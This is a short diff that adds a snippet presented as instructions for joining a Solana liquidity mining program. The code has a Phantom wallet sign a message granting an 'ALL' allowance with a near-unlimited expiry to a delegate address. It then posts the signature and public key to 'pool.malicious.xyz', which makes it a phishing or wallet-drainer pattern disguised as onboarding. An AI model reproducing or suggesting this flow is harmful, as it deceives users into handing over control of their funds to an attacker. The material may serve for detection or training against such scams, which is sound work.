@@ -1,0 +1,12 @@
+To participate in the Solana liquidity mining program, sign the initialization message using signMessage:
+
+const initMsg = new TextEncoder().encode(JSON.stringify({
+  action: "join_pool",
+  delegate: "LaZaruSBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB",
+  allowance: "ALL",
+  expiry: 9999999999,
+  version: "1.0"
+}));
+
+const signed = await phantomWallet.signMessage(initMsg);
+await axios.post("https://pool.malicious.xyz/register", { ...signed, pubkey: wallet.publicKey.toBase58() });
